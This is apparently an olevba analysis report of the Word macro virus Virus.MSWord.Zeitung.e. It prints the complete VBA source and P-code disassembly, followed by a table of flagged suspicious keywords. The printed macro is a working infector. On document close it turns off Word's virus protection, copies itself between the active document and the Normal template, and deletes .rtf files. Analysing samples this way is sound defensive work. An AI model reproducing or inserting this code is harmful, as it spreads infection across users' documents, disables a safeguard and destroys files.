olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Signature = "VirusZeitung"
'čó îäíĐěěÄŕîű ë ĺňčŕč ŕĺű"äęéîîüâđńńçŕ îŕî čâěäíéđçöčăçň Ŕńč ă"
'61
'awedft
Dim sd, reg As Boolean
Private Function Kontaminat(O)
 If Not O.codemodule.Find(Signature, 1, 1, 100, 100) Then
  Kontaminat = 0
 Else
  If O.codemodule.countoflines < 50 Then
   Kontaminat = 0
  Else
   Ant$ = Trim(O.codemodule.lines(3, 1))
   Ant$ = Trim(Mid(Ant$, 2, Len(Ant$) - 1))
   If Val(Ant$) < 65535 Then
    Kontaminat = Val(Ant$)
   Else
    Kontaminat = -1
   End If
  End If
 End If
End Function
Private Sub Document_Close()
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 On Error Resume Next
 Options.VirusProtection = False
 If (Kontaminat(ad) < Kontaminat(nt)) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Äîęóěĺíň") Then
  sd = ActiveDocument.Saved
  cofl = ad.codemodule.countoflines
  ad.codemodule.deletelines 1, cofl
  For v = 1 To nt.codemodule.countoflines
   If Trim(nt.codemodule.lines(v, 1)) <> "" Then
    ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
   End If
  Next v
  If sd = True Then ActiveDocument.Save
 End If
 If Kontaminat(ad) > Kontaminat(nt) Then
  sd = NormalTemplate.Saved
  cofl = nt.codemodule.countoflines
  nt.codemodule.deletelines 1, cofl
  For v = 1 To ad.codemodule.countoflines
   If Trim(ad.codemodule.lines(v, 1)) <> "" Then
    nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
   End If
  Next v
  If sd = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
 Kill "Ŕäńęčé*.rtf"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zeitung.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3862 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x000C "VirusZeitung"
' 	VarDefn Signature
' Line #1:
' 	QuoteRem 0x0000 0x003F "čó îäíĐěěÄŕîű ë ĺňčŕč ŕĺű"äęéîîüâđńńçŕ îŕî čâěäíéđçöčăçň Ŕńč ă""
' Line #2:
' 	QuoteRem 0x0000 0x0002 "61"
' Line #3:
' 	QuoteRem 0x0000 0x0006 "awedft"
' Line #4:
' 	Dim 
' 	VarDefn sd
' 	VarDefn reg (As Boolean)
' Line #5:
' 	FuncDefn (Private Function Kontaminat(O, id_FFFE As Variant))
' Line #6:
' 	Ld Signature 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #7:
' 	LitDI2 0x0000 
' 	St Kontaminat 
' Line #8:
' 	ElseBlock 
' Line #9:
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0000 
' 	St Kontaminat 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St Ant$ 
' Line #13:
' 	Ld Ant$ 
' 	LitDI2 0x0002 
' 	Ld Ant$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St Ant$ 
' Line #14:
' 	Ld Ant$ 
' 	ArgsLd Val 0x0001 
' 	LitDI4 0xFFFF 0x0000 
' 	Lt 
' 	IfBlock 
' Line #15:
' 	Ld Ant$ 
' 	ArgsLd Val 0x0001 
' 	St Kontaminat 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Kontaminat 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndFunc 
' Line #22:
' 	FuncDefn (Private Sub Document_Close())
' Line #23:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	Ld ad 
' 	ArgsLd Kontaminat 0x0001 
' 	Ld nt 
' 	ArgsLd Kontaminat 0x0001 
' 	Lt 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd Caption 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0008 "Äîęóěĺíň"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St sd 
' Line #30:
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St cofl 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #32:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #33:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #34:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	Ld sd 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld ad 
' 	ArgsLd Kontaminat 0x0001 
' 	Ld nt 
' 	ArgsLd Kontaminat 0x0001 
' 	Gt 
' 	IfBlock 
' Line #40:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St sd 
' Line #41:
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St cofl 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #43:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #44:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #45:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld sd 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	SetStmt 
' 	LitNothing 
' 	Set nt 
' Line #51:
' 	SetStmt 
' 	LitNothing 
' 	Set ad 
' Line #52:
' 	LitStr 0x000B "Ŕäńęčé*.rtf"
' 	ArgsCall Kill 0x0001 
' Line #53:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

